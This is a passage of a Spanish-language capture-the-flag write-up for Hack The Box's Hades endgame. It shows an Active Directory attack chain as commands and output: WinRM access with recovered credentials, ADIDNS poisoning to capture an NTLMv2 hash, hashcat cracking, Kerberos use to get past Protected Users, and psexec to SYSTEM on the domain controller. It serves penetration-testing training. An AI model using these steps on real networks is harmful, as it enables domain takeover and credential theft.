+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0  
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+[*] Config file parsed
+[*] Config file parsed
+[*] Config file parsed</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\Administrator\Documents> </span><span class="am">cp </span><span class="p">output.html \\10.10.14.10\kali\output.html  
+PS C:\Users\Administrator\Documents></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Abrimos el <code class="language-plaintext highlighter-rouge">output.html</code> en el navegador y nos encontramos con un <code class="language-plaintext highlighter-rouge">KeeWeb</code> el cual contiene bajo el dominio <code class="language-plaintext highlighter-rouge">web.htb.local</code> el usuario <code class="language-plaintext highlighter-rouge">remote_user</code> y su contraseña</p>
+<a href="/endgames/hades/16.png" target="_blank"><div><p><img src="/endgames/hades/16.png"></p></div></a>
+
+<p class="plain-text">Ya que el usuario se llama <code class="language-plaintext highlighter-rouge">remote_user</code> probamos si las <code class="language-plaintext highlighter-rouge">credenciales</code> son validas mediante una autenticacion con <code class="language-plaintext highlighter-rouge">winrm</code> hacia <code class="language-plaintext highlighter-rouge">web.htb.local</code>, devuelve <code class="language-plaintext highlighter-rouge">Pwn3d!</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ proxychains </span><span class="p">-q crackmapexec winrm web.htb.local -u remote_user -p </span><span class="am">'FZg28$dJe*Hx7c'</span><span class="p">
+</span><span class="az">SMB         </span><span class="p">web.htb.local   5985   WEB              </span><span class="az">[*] </span><span class="p">Windows 6.3 Build 9600 (name:WEB) (domain:htb.local)  
+</span><span class="az">HTTP        </span><span class="p">web.htb.local   5985   WEB              </span><span class="az">[*] </span><span class="p">http://web.htb.local:5985/wsman
+</span><span class="az">WINRM       </span><span class="p">web.htb.local   5985   WEB              </span><span class="ve">[+] </span><span class="p">htb.local\remote_user:FZg28$dJe*Hx7c </span><span class="am">(Pwn3d!)</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Podemos simplemente conectarnos con <code class="language-plaintext highlighter-rouge">evil-winrm</code> y leer la <code class="language-plaintext highlighter-rouge">flag</code> en el escritorio</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ proxychains </span><span class="p">-q evil-winrm -i web.htb.local -u remote_user -p </span><span class="am">'FZg28$dJe*Hx7c'</span><span class="p">  
+PS C:\Users\remote_user.HTB\Documents> </span><span class="am">whoami</span><span class="p">
+htb\remote_user
+PS C:\Users\remote_user.HTB\Documents> </span><span class="am">type </span><span class="p">..\Desktop\flag.txt
+HADES{From_RBCD_To_p4s5word_v@Ult}
+PS C:\Users\remote_user.HTB\Documents></span>
+</code></pre></div></div><br>
+</section>
+
+<section class="post" id="flag6">
+<br><h3 class="post-title">Celestial</h3>
+<h4 class="post-title">HADES{Why_llmnr_wh3n_y0u_got_adidns}</h4><br>
+
+<p class="plain-text">En el directorio <code class="language-plaintext highlighter-rouge">Program Files</code> podemos encontrar que esta instalado <code class="language-plaintext highlighter-rouge">Wireshark</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Program Files> </span><span class="am">dir</span><span class="p">
+
+    Directory: C:\Program Files
+
+Mode                LastWriteTime     Length Name
+----                -------------     ------ ----
+d----         8/19/2019   9:20 PM            Common Files
+d----          9/3/2019   9:10 PM            Docker Toolbox
+d----          9/3/2019   9:11 PM            Git
+d----         3/21/2014  11:09 AM            Internet Explorer
+d----         8/25/2019  12:37 PM            Npcap
+d----          9/3/2019   9:12 PM            Oracle
+d----         10/2/2019   4:30 PM            Update Services
+d----         8/19/2019   9:22 PM            VMware
+d----         10/3/2019   2:21 AM            WindowsPowerShell  
+d----         8/25/2019  12:38 PM            Wireshark
+
+PS C:\Program Files></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Entramos en el directorio y con <code class="language-plaintext highlighter-rouge">tshark</code> nos ponemos en escucha de cualquier <code class="language-plaintext highlighter-rouge">trafico</code> desde la interfaz <code class="language-plaintext highlighter-rouge">Ethernet0</code>, el output lo guardamos como <code class="language-plaintext highlighter-rouge">capture.pcap</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Program Files\Wireshark> </span><span class="am">.\tshark.exe </span><span class="c1">-i </span><span class="p">Ethernet0 </span><span class="c1">-w </span><span class="p">C:\ProgramData\capture.pcap  
+Capturing on 'Ethernet0'
+</span><span class="ro">^C</span><span class="p">
+PS C:\Program Files\Wireshark></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Abrimos la captura de trafico con <code class="language-plaintext highlighter-rouge">wireshark</code> y podemos ver que se han realizado algunas peticiones <code class="language-plaintext highlighter-rouge">DNS</code> hacia los subdominios <code class="language-plaintext highlighter-rouge">db1</code>, <code class="language-plaintext highlighter-rouge">db2</code> y <code class="language-plaintext highlighter-rouge">db3</code> de <code class="language-plaintext highlighter-rouge">htb.local</code></p>
+<a href="/endgames/hades/12.png" target="_blank"><div><p><img src="/endgames/hades/12.png"></p></div></a>
+
+<p class="plain-text">Esperando poder capturar algun <code class="language-plaintext highlighter-rouge">trafico</code> con algun tipo de <code class="language-plaintext highlighter-rouge">autenticacion</code> iniciaremos subiendo nuevamente el modulo de <code class="language-plaintext highlighter-rouge">Powermad.ps1</code> e importandolo</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\remote_user.HTB\Documents> </span><span class="am">upload </span><span class="p">Powermad.ps1
+</span><span class="az">
+Info: Uploading Powermad.ps1 to C:\Users\remote_user.HTB\Documents\Powermad.ps1  
+</span><span class="sa">
+Data: 180768 bytes of 180768 bytes copied
+</span><span class="az">
+Info: Upload successful!
+</span><span class="p">
+PS C:\Users\remote_user.HTB\Documents> </span><span class="am">Import-Module</span><span class="p"> .\Powermad.ps1
+PS C:\Users\remote_user.HTB\Documents></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Los usuarios <code class="language-plaintext highlighter-rouge">autenticados</code> pueden modificar el <code class="language-plaintext highlighter-rouge">dns</code>, definimos las <code class="language-plaintext highlighter-rouge">credenciales</code> de <code class="language-plaintext highlighter-rouge">remote_user</code> y hacemos que al apuntar a <code class="language-plaintext highlighter-rouge">db1</code> apunte a nuestra <code class="language-plaintext highlighter-rouge">ip</code> de la vpn</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\remote_user.HTB\Documents> </span><span class="ve">$SecPassword </span><span class="c1">= </span><span class="am">ConvertTo-SecureString </span><span class="az">'FZg28$dJe*Hx7c' </span><span class="c1">-AsPlainText -Force</span><span class="p">
+PS C:\Users\remote_user.HTB\Documents> </span><span class="ve">$Cred </span><span class="c1">= </span><span class="am">New-Object </span><span class="p">System.Management.Automation.PSCredential(</span><span class="az">'htb\remote_user'</span><span class="p">, </span><span class="ve">$SecPassword</span><span class="p">)
+PS C:\Users\remote_user.HTB\Documents> </span><span class="am">New-ADIDNSNode </span><span class="c1">-Node </span><span class="p">db1 </span><span class="c1">-Data </span><span class="p">10.10.14.10 </span><span class="c1">-DomainController </span><span class="p">dc1.htb.local </span><span class="c1">-Domain </span><span class="p">htb.local </span><span class="c1">-Zone </span><span class="p">htb.local </span><span class="c1">-Credential </span><span class="ve">$Cred </span><span class="c1">-Forest </span><span class="p">htb.local  
+PS C:\Users\remote_user.HTB\Documents></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ahora podemos comprobar que <code class="language-plaintext highlighter-rouge">db1.htb.local</code> apunta a nuestra direccion <code class="language-plaintext highlighter-rouge">ip</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\remote_user.HTB\Documents> </span><span class="am">nslookup </span><span class="p">db1 192.168.3.203  
+
+DNS request timed out.
+    timeout was 2 seconds.
+Server:  UnKnown
+Address:  192.168.3.203
+
+Name:    db1.htb.local
+Address:  10.10.14.10
+
+PS C:\Users\remote_user.HTB\Documents></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Despues de unos minutos de estar en escucha con <code class="language-plaintext highlighter-rouge">responder</code>, recibimos una petición con <code class="language-plaintext highlighter-rouge">autenticación</code> por parte de <code class="language-plaintext highlighter-rouge">Administrator</code> y su hash <code class="language-plaintext highlighter-rouge">NTLMv2</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ sudo responder </span><span class="p">-I tun0
+                                         __
+  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
+  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
+  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
+                   |__|
+
+           </span><span class="am">NBT-NS, LLMNR & MDNS Responder 3.1.3.0
+
+</span><span class="ve">[+] </span><span class="p">Listening for events...
+
+</span><span class="az">[SMB] </span><span class="p">NTLMv2-SSP Client   : </span><span class="am">10.13.38.16
+</span><span class="az">[SMB] </span><span class="p">NTLMv2-SSP Username : </span><span class="am">\administrator
+</span><span class="az">[SMB] </span><span class="p">NTLMv2-SSP Hash     : </span><span class="am">administrator:::1122334455667788:9F531BAB908E89540CBF2CEBD6019340:0101000000000000802CD0056F79D9014A57C603B004B95000000000020008004C004E003800350001001E00570049004E002D0044004200360055004A004D005300550057005700420004003400570049004E002D0044004200360055004A004D00530055005700570042002E004C004E00380035002E004C004F00430041004C00030014004C004E00380035002E004C004F00430041004C00050014004C004E00380035002E004C004F00430041004C0007000800802CD0056F79D901060004000200000008003000300000000000000000000000003000005C512391B0E2AEA8D470AC66A19C4505C2B4BEB2102AC8B3847E4282E4C57F040A001000000000000000000000000000000000000900240063006900660073002F006400620031002E006800740062002E006C006F00630061006C00000000000000000000000000  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">De primeras <code class="language-plaintext highlighter-rouge">hashcat</code> no logra romper el hash con el <code class="language-plaintext highlighter-rouge">rockyou.txt</code> sin embargo al aplicar algunas <code class="language-plaintext highlighter-rouge">reglas</code> obtenemos la contraseña <code class="language-plaintext highlighter-rouge">Myp@ssw0rd</code> para <code class="language-plaintext highlighter-rouge">Administrator</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ hashcat </span><span class="p">-a 0 -m 5600 hash /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt -r /usr/share/hashcat/rules/d3ad0ne.rule --force
+hashcat (v6.1.1) starting...
+
+OpenCL API (OpenCL 1.2 pocl 1.6, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
+=============================================================================================================================
+* Device #1: pthread-DO-Regular, 5841/5905 MB (2048 MB allocatable), 4MCU
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 256
+
+Hashes: 1 digests; 1 unique digests, 1 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+Rules: 34097
+
+Applicable optimizers applied:
+* Zero-Byte
+* Not-Iterated
+* Single-Hash
+* Single-Salt
+
+Host memory required for this attack: 65 MB
+
+Dictionary cache built:
+* Filename..: /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
+* Passwords.: 1471056
+* Bytes.....: 15069565
+* Keyspace..: 50158596432
+* Runtime...: 0 secs
+
+ADMINISTRATOR:::1122334455667788:9f531bab908e89540cbf2cebd6019340:0101000000000000802cd0056f79d9014a57c603b004b95000000000020008004c004e003800350001001e00570049004e002d0044004200360055004a004d005300550057005700420004003400570049004e002d0044004200360055004a004d00530055005700570042002e004c004e00380035002e004c004f00430041004c00030014004c004e00380035002e004c004f00430041004c00050014004c004e00380035002e004c004f00430041004c0007000800802cd0056f79d901060004000200000008003000300000000000000000000000003000005c512391b0e2aea8d470ac66a19c4505c2b4beb2102ac8b3847e4282e4c57f040a001000000000000000000000000000000000000900240063006900660073002f006400620031002e006800740062002e006c006f00630061006c00000000000000000000000000:Myp@ssw0rd  
+
+Session..........: hashcat
+Status...........: Cracked
+Hash.Name........: NetNTLMv2
+Hash.Target......: ADMINISTRATOR:::1122334455667788:9f531bab908e89540c...000000
+Guess.Base.......: File (/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt)
+Guess.Mod........: Rules (/usr/share/hashcat/rules/d3ad0ne.rule)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:   348.1 kH/s (14.54ms) @ Accel:8 Loops:4 Thr:64 Vec:8
+Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
+Rejected.........: 0/8733004800 (0.00%)
+Restore.Sub.#1...: Salt:0 Amplifier:37644-37648 Iteration:0-4</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Con <code class="language-plaintext highlighter-rouge">crackmapexec</code> comprobamos la contraseña de <code class="language-plaintext highlighter-rouge">Administrator</code> de manera <code class="language-plaintext highlighter-rouge">local</code> hacia el equipo <code class="language-plaintext highlighter-rouge">WEB</code>, estas son <code class="language-plaintext highlighter-rouge">válidas</code> tantpo para <code class="language-plaintext highlighter-rouge">smb</code> como para <code class="language-plaintext highlighter-rouge">winrm</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ proxychains </span><span class="p">-q crackmapexec winrm web.htb.local -u Administrator -p Myp@ssw0rd --local-auth
+</span><span class="az">SMB         </span><span class="p">web.htb.local   5985   WEB              </span><span class="az">[*] </span><span class="p">Windows 6.3 Build 9600 (name:WEB) (domain:WEB)  
+</span><span class="az">HTTP        </span><span class="p">web.htb.local   5985   WEB              </span><span class="az">[*] </span><span class="p">http://web.htb.local:5985/wsman
+</span><span class="az">WINRM       </span><span class="p">web.htb.local   5985   WEB              </span><span class="ve">[+] </span><span class="p">WEB\Administrator:Myp@ssw0rd </span><span class="am">(Pwn3d!)</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Nos conectamos como <code class="language-plaintext highlighter-rouge">Administrator</code> hacia <code class="language-plaintext highlighter-rouge">WEB</code> donde podemos leer la <code class="language-plaintext highlighter-rouge">flag</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ proxychains </span><span class="p">-q evil-winrm -i web.htb.local -u Administrator -p Myp@ssw0rd  
+PS C:\Users\Administrator\Documents> </span><span class="am">whoami</span><span class="p">
+web\administrator
+PS C:\Users\Administrator\Documents> </span><span class="am">type </span><span class="p">..\Desktop\flag.txt
+HADES{Why_llmnr_wh3n_y0u_got_adidns}
+PS C:\Users\Administrator\Documents></span>
+</code></pre></div></div><br>
+</section>
+
+<section class="post" id="flag7">
+<br><h3 class="post-title">Dominion</h3>
+<h4 class="post-title">HADES{Tam1ng_Kerber0s_Wi1l_gRant_4cCess_t0_H4des}</h4><br>
+
+<p class="plain-text">Al intentar reutilizar la <code class="language-plaintext highlighter-rouge">contraseña</code> para <code class="language-plaintext highlighter-rouge">Administrator</code> pero esta vez hacia el <code class="language-plaintext highlighter-rouge">DC1</code> a nivel de <code class="language-plaintext highlighter-rouge">dominio</code>, nos devuelve un <code class="language-plaintext highlighter-rouge">error</code> de que la cuenta esta <code class="language-plaintext highlighter-rouge">restringida</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ proxychains </span><span class="p">-q crackmapexec smb dc1.htb.local -u Administrator -p Myp@ssw0rd
+</span><span class="az">SMB         </span><span class="p">dc1.htb.local   445    DC1              </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 17763 x64 (name:DC1) (domain:htb.local) (signing:True) (SMBv1:False)  
+</span><span class="az">SMB         </span><span class="p">dc1.htb.local   445    DC1              </span><span class="sa">[-] </span><span class="p">htb.local\Administrator:Myp@ssw0rd STATUS_ACCOUNT_RESTRICTION</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Esto es porque el usuario <code class="language-plaintext highlighter-rouge">Administrator</code> como podemos ver en <code class="language-plaintext highlighter-rouge">bloodhound</code> pertenece al gropo <code class="language-plaintext highlighter-rouge">Protected Users</code> y no se puede <code class="language-plaintext highlighter-rouge">autenticar</code> a nivel de <code class="language-plaintext highlighter-rouge">smb</code></p>
+<a href="/endgames/hades/15.png" target="_blank"><div><p><img src="/endgames/hades/15.png"></p></div></a>   
+
+<p class="plain-text">La solucion es muy sencilla ya que la <code class="language-plaintext highlighter-rouge">restriccion</code> solo aplica para <code class="language-plaintext highlighter-rouge">smb</code>, al agregar el parametro <code class="language-plaintext highlighter-rouge">-k</code> para autenticarnos por <code class="language-plaintext highlighter-rouge">kerberos</code>, devuelve un <code class="language-plaintext highlighter-rouge">Pwn3d!</code>, es valida</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ proxychains</span><span class="p"> -q crackmapexec smb dc1.htb.local -u Administrator -p Myp@ssw0rd -k
+</span><span class="az">SMB         </span><span class="p">dc1.htb.local   445    DC1              </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 17763 x64 (name:DC1) (domain:htb.local) (signing:True) (SMBv1:False)  
+</span><span class="az">SMB         </span><span class="p">dc1.htb.local   445    DC1              </span><span class="ve">[+] </span><span class="p">htb.local\Administrator:Myp@ssw0rd </span><span class="am">(Pwn3d!)</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Nos conectamos simplemente con <code class="language-plaintext highlighter-rouge">psexec</code> hacia el <code class="language-plaintext highlighter-rouge">DC1</code> con el parametro <code class="language-plaintext highlighter-rouge">-k</code> para autenticarnos por <code class="language-plaintext highlighter-rouge">kerberos</code> y obtenemos una <code class="language-plaintext highlighter-rouge">cmd</code> como <code class="language-plaintext highlighter-rouge">nt authority\system</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ proxychains </span><span class="p">-q impacket-psexec htb.local/Administrator:Myp@ssw0rd@dc1.htb.local -k  
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[*] Requesting shares on dc1.htb.local.....
+[*] Found writable share ADMIN$
+[*] Uploading file KZKXLYRd.exe
+[*] Opening SVCManager on dc1.htb.local.....
+[*] Creating service YklQ on dc1.htb.local.....
+[*] Starting service YklQ.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.17763.678]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32> </span><span class="am">whoami</span><span class="p">
+nt authority\system
+
+C:\Windows\system32> </span><span class="am">hostname</span><span class="p">
+dc1
+
+C:\Windows\system32></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Otra forma es solicitando un <code class="language-plaintext highlighter-rouge">ticket</code> con <code class="language-plaintext highlighter-rouge">getST</code> e importandolo a <code class="language-plaintext highlighter-rouge">KRB5CCNAME</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ proxychains</span><span class="p"> -q impacket-getST -spn cifs/dc1.htb.local htb.local/Administrator@dc1.htb.local -dc-ip 192.168.3.203  
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+Password: Myp@ssw0rd
+
+[*] Getting TGT for user
+[*] Getting ST for user
+[*] Saving ticket in Administrator@dc1.htb.local.ccache
+
+</span><span class="ve">❯ export </span><span class="p">KRB5CCNAME=Administrator@dc1.htb.local.ccache</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Podemos comprobar la autenticación con <code class="language-plaintext highlighter-rouge">crackmapexec</code> simplemente indicandole que use el <code class="language-plaintext highlighter-rouge">ticket</code> que se encuentra en <code class="language-plaintext highlighter-rouge">kcache</code>, nuevamente nos devuelve <code class="language-plaintext highlighter-rouge">Pwn3d!</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ proxychains</span><span class="p"> -q crackmapexec smb dc1.htb.local -k --use-kcache
+</span><span class="az">SMB         </span><span class="p">dc1.htb.local   445    DC1              </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 17763 x64 (name:DC1) (domain:htb.local) (signing:True) (SMBv1:False)  
+</span><span class="az">SMB         </span><span class="p">dc1.htb.local   445    DC1              </span><span class="ve">[+] </span><span class="p">htb.local\ from ccache </span><span class="am">(Pwn3d!)</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Nos conectamos nuevamente con <code class="language-plaintext highlighter-rouge">psexec</code> esta vez simplemente usando el <code class="language-plaintext highlighter-rouge">ticket</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ proxychains </span><span class="p">-q impacket-psexec htb.local/Administrator@dc1.htb.local -k -no-pass  
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[*] Requesting shares on dc1.htb.local.....
+[*] Found writable share ADMIN$
+[*] Uploading file QMiaZJce.exe
+[*] Opening SVCManager on dc1.htb.local.....
+[*] Creating service MiCD on dc1.htb.local.....
+[*] Starting service MiCD.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.17763.678]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32> </span><span class="am">whoami</span><span class="p">
+nt authority\system
+
+C:\Windows\system32> </span><span class="am">hostname</span><span class="p">
+dc1
+
+C:\Windows\system32></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Para eliminar la <code class="language-plaintext highlighter-rouge">restriccion</code> de <code class="language-plaintext highlighter-rouge">smb</code> basta con eliminar al usuario <code class="language-plaintext highlighter-rouge">Administrator</code> del grupo global <code class="language-plaintext highlighter-rouge">Protected Users</code> haciendo uso del comando <code class="language-plaintext highlighter-rouge">net group /del</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">C:\Windows\system32> </span><span class="am">net </span><span class="p">group </span><span class="az">"Protected Users" </span><span class="p">Administrator /del  
+The command completed successfully.
+
+C:\Windows\system32></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ahora nos autenticamos a nivel de <code class="language-plaintext highlighter-rouge">smb</code> normalmente hacia todos los equipos del <code class="language-plaintext highlighter-rouge">dominio</code>, las credenciales son <code class="language-plaintext highlighter-rouge">validas</code> y hemos comprometido todos los <code class="language-plaintext highlighter-rouge">equipos</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ proxychains</span><span class="p"> -q crackmapexec smb 192.168.3.201-203 -u Administrator -p Myp@ssw0rd
+</span><span class="az">SMB         </span><span class="p">192.168.3.202   445    WEB              </span><span class="az">[*] </span><span class="p">Windows Server 2012 R2 Standard 9600 x64 (name:WEB) (domain:htb.local) (signing:False) (SMBv1:True)  
+</span><span class="az">SMB         </span><span class="p">192.168.3.201   445    DEV              </span><span class="az">[*] </span><span class="p">Windows Server 2019 Standard 17763 x64 (name:DEV) (domain:htb.local) (signing:False) (SMBv1:True)
+</span><span class="az">SMB         </span><span class="p">192.168.3.203   445    DC1              </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 17763 x64 (name:DC1) (domain:htb.local) (signing:True) (SMBv1:False)
+</span><span class="az">SMB         </span><span class="p">192.168.3.202   445    WEB              </span><span class="ve">[+] </span><span class="p">htb.local\Administrator:Myp@ssw0rd </span><span class="am">(Pwn3d!)
+</span><span class="az">SMB         </span><span class="p">192.168.3.201   445    DEV              </span><span class="ve">[+] </span><span class="p">htb.local\Administrator:Myp@ssw0rd </span><span class="am">(Pwn3d!)
+</span><span class="az">SMB         </span><span class="p">192.168.3.203   445    DC1              </span><span class="ve">[+] </span><span class="p">htb.local\Administrator:Myp@ssw0rd </span><span class="am">(Pwn3d!)</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Podemos simplemente conectarnos con <code class="language-plaintext highlighter-rouge">evil-winrm</code> al <code class="language-plaintext highlighter-rouge">DC1</code> y leer la ultima <code class="language-plaintext highlighter-rouge">flag</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ proxychains</span><span class="p"> -q evil-winrm -i dc1.htb.local -u Administrator -p Myp@ssw0rd  
+PS C:\Users\Administrator.HTB\Documents> </span><span class="am">whoami</span><span class="p">
+htb\administrator
+PS C:\Users\Administrator.HTB\Documents> </span><span class="am">type</span><span class="p"> ..\Desktop\flag.txt
+HADES{Tam1ng_Kerber0s_Wi1l_gRant_4cCess_t0_H4des}
+PS C:\Users\Administrator.HTB\Documents></span>
+</code></pre></div></div><br>
+</section>
+
+</article>
+  </div>
+  <footer class="footer">
+    <span class="footer__copyright">&copy; 2023 - GatoGamer1155</span>
+  </footer><br><br>
+
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+<script type="text/javascript" src="/js/main.js?1678894953382991917"></script>
+
+    </div>
+  </body>
+</html>
